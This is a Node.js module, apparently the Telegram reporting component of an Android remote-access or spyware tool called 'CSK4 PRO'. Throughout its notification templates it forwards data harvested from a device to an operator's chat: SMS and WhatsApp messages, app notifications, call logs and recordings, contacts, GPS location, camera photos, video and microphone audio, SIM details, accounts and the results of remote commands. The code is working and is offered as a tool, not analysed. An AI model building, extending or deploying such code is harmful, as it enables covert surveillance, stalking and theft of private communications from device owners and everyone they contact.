// ============================================
// CSK4 PRO v4.2 - Telegram Bot Integration (FIXED)
// ============================================
// FIXES:
// - No hardcoded token (env only)
// - Queue cap (500 max)
// - Retry limit (3 attempts)
// - Better rate limit (sliding window)
// - Complete escapeHtml (quotes)
// - Deduplication
// - No infinite loop
// ============================================

const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

// ============ CONFIG ============
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ============ STATE ============
let bot = null;
let isEnabled = false;
let messageQueue = [];
let isSending = false;

// ============ RATE LIMIT (sliding window) ============
const RATE_LIMIT = {
  maxPerMinute: 20,
  maxPerSecond: 1,
  sentTimestamps: [],
};

// ✅ Deduplication
const recentMessages = new Map();
const DEDUP_WINDOW = 60 * 1000;

function getMessageHash(text) {
  return crypto.createHash('md5').update(text).digest('hex');
}

function isDuplicate(text) {
  const hash = getMessageHash(text);
  const now = Date.now();
  const last = recentMessages.get(hash);
  
  if (last && (now - last) < DEDUP_WINDOW) return true;
  
  recentMessages.set(hash, now);
  
  if (recentMessages.size > 500) {
    for (const [k, v] of recentMessages) {
      if (now - v > DEDUP_WINDOW) recentMessages.delete(k);
    }
  }
  return false;
}

// ✅ Sliding window rate limit
function canSend() {
  const now = Date.now();
  const oneMinuteAgo = now - 60000;
  const oneSecondAgo = now - 1000;
  
  // Clean old timestamps
  RATE_LIMIT.sentTimestamps = RATE_LIMIT.sentTimestamps.filter(t => t > oneMinuteAgo);
  
  // Check limits
  const lastMinute = RATE_LIMIT.sentTimestamps.length;
  const lastSecond = RATE_LIMIT.sentTimestamps.filter(t => t > oneSecondAgo).length;
  
  if (lastMinute >= RATE_LIMIT.maxPerMinute) return false;
  if (lastSecond >= RATE_LIMIT.maxPerSecond) return false;
  
  RATE_LIMIT.sentTimestamps.push(now);
  return true;
}

// ============ INITIALIZE BOT ============
function init() {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.log('⚠️ Telegram not configured — skipping');
    return false;
  }

  try {
    bot = new TelegramBot(BOT_TOKEN, { 
      polling: false,
      webHook: false
    });

    isEnabled = true;
    console.log('📱 Telegram Bot initialized');
    console.log(`   Chat ID: ${CHAT_ID}`);

    return true;
  } catch (error) {
    console.error('❌ Telegram init failed:', error.message);
    isEnabled = false;
    return false;
  }
}

// ============ SEND MESSAGE ============
async function sendMessage(text, options = {}) {
  if (!isEnabled || !bot) {
    console.log('⚠️ Telegram not enabled');
    return false;
  }

  // ✅ Dedup
  if (isDuplicate(text)) {
    return false;
  }

  // Rate limit
  if (!canSend()) {
    // ✅ Cap queue
    if (messageQueue.length >= 500) {
      messageQueue.shift();
    }
    messageQueue.push({ text, options, retries: 0 });
    processQueue();
    return false;
  }

  try {
    await bot.sendMessage(CHAT_ID, text, {
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      ...options
    });
    return true;
  } catch (error) {
    console.error('❌ Telegram send failed:', error.message);
    return false;
  }
}

// ============ PROCESS QUEUE ============
async function processQueue() {
  if (isSending || messageQueue.length === 0) return;
  isSending = true;

  while (messageQueue.length > 0) {
    if (!canSend()) {
      // ✅ Max 5 sec wait
      await new Promise(r => setTimeout(r, Math.min(2000, 5000)));
      continue;
    }

    const msg = messageQueue.shift();
    const retries = (msg.retries || 0) + 1;
    
    // ✅ Retry limit
    if (retries > 3) {
      console.log('⚠️ Dropped message after 3 retries');
      continue;
    }

    try {
      await bot.sendMessage(CHAT_ID, msg.text, {
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...msg.options
      });
    } catch (error) {
      const em = error.message || '';
      if (em.includes('429')) {
        const m = em.match(/retry after (\d+)/);
        const waitSec = m ? parseInt(m[1]) : 10;
        console.log(`⏳ TG rate limit — waiting ${waitSec}s`);
        messageQueue.unshift({ ...msg, retries });
        await new Promise(r => setTimeout(r, waitSec * 1000));
      } else {
        console.error('❌ Queue send failed:', em);
      }
    }
  }

  isSending = false;
}

// ============ SEND PHOTO ============
async function sendPhoto(photoUrl, caption = '') {
  if (!isEnabled || !bot || !canSend()) return false;

  try {
    await bot.sendPhoto(CHAT_ID, photoUrl, {
      caption: caption,
      parse_mode: 'HTML'
    });
    return true;
  } catch (error) {
    console.error('❌ Telegram photo failed:', error.message);
    return false;
  }
}

// ============ SEND DOCUMENT ============
async function sendDocument(documentUrl, caption = '') {
  if (!isEnabled || !bot || !canSend()) return false;

  try {
    await bot.sendDocument(CHAT_ID, documentUrl, {
      caption: caption,
      parse_mode: 'HTML'
    });
    return true;
  } catch (error) {
    console.error('❌ Telegram document failed:', error.message);
    return false;
  }
}

// ============ SEND AUDIO ============
async function sendAudio(audioUrl, caption = '') {
  if (!isEnabled || !bot || !canSend()) return false;

  try {
    await bot.sendAudio(CHAT_ID, audioUrl, {
      caption: caption,
      parse_mode: 'HTML'
    });
    return true;
  } catch (error) {
    console.error('❌ Telegram audio failed:', error.message);
    return false;
  }
}

// ============ SEND VIDEO ============
async function sendVideo(videoUrl, caption = '') {
  if (!isEnabled || !bot || !canSend()) return false;

  try {
    await bot.sendVideo(CHAT_ID, videoUrl, {
      caption: caption,
      parse_mode: 'HTML'
    });
    return true;
  } catch (error) {
    console.error('❌ Telegram video failed:', error.message);
    return false;
  }
}

// ============ SEND LOCATION ============
async function sendLocation(lat, lng) {
  if (!isEnabled || !bot || !canSend()) return false;

  try {
    await bot.sendLocation(CHAT_ID, lat, lng);
    return true;
  } catch (error) {
    console.error('❌ Telegram location failed:', error.message);
    return false;
  }
}

// ============ NOTIFICATION TEMPLATES ============

async function notifyDeviceOnline(deviceName, deviceId, model, android, battery) {
  const text = `🟢 <b>Device Online</b>

📱 <b>Name:</b> ${escapeHtml(deviceName)}
🆔 <b>ID:</b> <code>${deviceId}</code>
📲 <b>Model:</b> ${escapeHtml(model)}
🤖 <b>Android:</b> ${android}
🔋 <b>Battery:</b> ${battery}%

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

async function notifyLocation(deviceName, lat, lng, accuracy) {
  const mapsUrl = `https://maps.google.com/?q=${lat},${lng}`;
  const text = `📍 <b>Location Update</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
🗺️ <b>Coordinates:</b> <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>
🎯 <b>Accuracy:</b> ${accuracy ? Math.round(accuracy) + 'm' : 'N/A'}

<a href="${mapsUrl}">🗺️ Open in Maps</a>

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

async function notifySMS(deviceName, from, body, senderName) {
  const displayFrom = senderName && senderName !== 'Unknown' 
    ? `${escapeHtml(senderName)} (${from})` 
    : from;
  const text = `💬 <b>New SMS</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
👤 <b>From:</b> ${displayFrom}
📝 <b>Message:</b>
<i>${escapeHtml(body)}</i>

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

async function notifyWhatsApp(deviceName, from, message) {
  const text = `💬 <b>WhatsApp Message</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
👤 <b>From:</b> ${escapeHtml(from)}
📝 <b>Message:</b>
<i>${escapeHtml(message)}</i>

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

async function notifyNotification(deviceName, appName, title, text) {
  const message = `🔔 <b>Notification</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
📲 <b>App:</b> ${escapeHtml(appName)}
📌 <b>Title:</b> ${escapeHtml(title || 'No title')}
📝 <b>Text:</b> <i>${escapeHtml(text || 'No text')}</i>

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(message);
}

async function notifyCall(deviceName, number, name, type, duration) {
  const typeEmoji = { 1: '📥', 2: '📤', 3: '❌', 4: '📮', 5: '🚫', 6: '⏱️' };
  const typeText = { 1: 'Incoming', 2: 'Outgoing', 3: 'Missed', 4: 'Voicemail', 5: 'Rejected', 6: 'Blocked' };
  const text = `${typeEmoji[type] || '📞'} <b>Call ${typeText[type] || 'Event'}</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
👤 <b>From:</b> ${escapeHtml(name || 'Unknown')}
📞 <b>Number:</b> <code>${number}</code>
⏱️ <b>Duration:</b> ${duration}s

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

async function notifyContact(deviceName, name, phone, type) {
  const text = `🆕 <b>New Contact</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
👤 <b>Name:</b> ${escapeHtml(name)}
📞 <b>Phone:</b> <code>${phone}</code>
📱 <b>Type:</b> ${type || 'Mobile'}

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

async function notifyPhoto(deviceName, photoUrl) {
  const caption = `📷 <b>Photo Captured</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
⏰ ${new Date().toLocaleString()}`;
  return await sendPhoto(photoUrl, caption);
}

async function notifyVideo(deviceName, videoUrl) {
  const caption = `🎥 <b>Video Recorded</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
⏰ ${new Date().toLocaleString()}`;
  return await sendVideo(videoUrl, caption);
}

async function notifyAudio(deviceName, audioUrl) {
  const caption = `🎤 <b>Audio Recorded</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
⏰ ${new Date().toLocaleString()}`;
  return await sendAudio(audioUrl, caption);
}

async function notifyCallRecording(deviceName, number, duration, audioUrl) {
  const caption = `🎙️ <b>Call Recording</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
📞 <b>Number:</b> <code>${number}</code>
⏱️ <b>Duration:</b> ${duration}s

⏰ ${new Date().toLocaleString()}`;
  return await sendDocument(audioUrl, caption);
}

async function notifyActivity(deviceName, type, data) {
  const text = `📊 <b>Activity: ${type}</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
📋 <b>Data:</b> <code>${escapeHtml(JSON.stringify(data))}</code>

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

async function notifyBattery(deviceName, level, isCharging) {
  const emoji = isCharging ? '🔌' : (level <= 15 ? '🔴' : '🔋');
  const status = isCharging ? 'Charging' : 'On Battery';
  const text = `${emoji} <b>Battery Alert</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
🔋 <b>Level:</b> ${level}%
⚡ <b>Status:</b> ${status}

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

async function notifySimInfo(deviceName, sims) {
  let simText = '';
  if (sims && sims.length > 0) {
    sims.forEach(sim => {
      simText += `\n<b>SIM ${sim.slot}:</b>\n`;
      simText += `  📞 ${sim.number || 'N/A'}\n`;
      simText += `  📡 ${sim.operator || 'N/A'}\n`;
      simText += `  📶 ${sim.networkType || 'N/A'}\n`;
    });
  }
  const text = `📱 <b>SIM Info</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
${simText}

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

async function notifyAccounts(deviceName, accounts) {
  let accText = '';
  if (accounts && accounts.length > 0) {
    accounts.forEach(acc => {
      accText += `\n📧 ${escapeHtml(acc.name)}\n  Type: ${acc.type}\n`;
    });
  }
  const text = `👤 <b>Accounts Found</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
<b>Total:</b> ${accounts?.length || 0}
${accText}

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

async function notifyEmails(deviceName, emails) {
  let emailText = '';
  if (emails && emails.length > 0) {
    emails.forEach(email => {
      emailText += `\n📧 ${escapeHtml(email)}`;
    });
  }
  const text = `📧 <b>Email Accounts</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
<b>Total:</b> ${emails?.length || 0}
${emailText}

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

async function notifyCommand(deviceName, command, result) {
  const text = `🎮 <b>Command Executed</b>

📱 <b>Device:</b> ${escapeHtml(deviceName)}
⚡ <b>Command:</b> <code>${command}</code>
✅ <b>Result:</b> ${escapeHtml(result)}

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

async function notifySystem(title, message) {
  const text = `🚨 <b>${escapeHtml(title)}</b>

${escapeHtml(message)}

⏰ ${new Date().toLocaleString()}`;
  return await sendMessage(text);
}

// ============ ESCAPE HTML (FIXED — quotes included) ============
function escapeHtml(text) {
  if (!text) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// ============ TEST ============
async function test() {
  return await sendMessage('🧪 <b>Test Message</b>\n\nCSK4 Telegram Bot is working!');
}

// ============ STATUS ============
function getStatus() {
  return {
    enabled: isEnabled,
    hasBot: !!bot,
    chatId: CHAT_ID,
    queueLength: messageQueue.length,
    recentCount: RATE_LIMIT.sentTimestamps.length
  };
}

// ============ EXPORTS ============
module.exports = {
  init,
  sendMessage,
  sendPhoto,
  sendVideo,
  sendDocument,
  sendAudio,
  sendLocation,
  test,
  getStatus,
  
  notifyDeviceOnline,
  notifyLocation,
  notifySMS,
  notifyWhatsApp,
  notifyNotification,
  notifyCall,
  notifyContact,
  notifyPhoto,
  notifyVideo,
  notifyAudio,
  notifyCallRecording,
  notifyActivity,
  notifyBattery,
  notifySimInfo,
  notifyAccounts,
  notifyEmails,
  notifyCommand,
  notifySystem
};
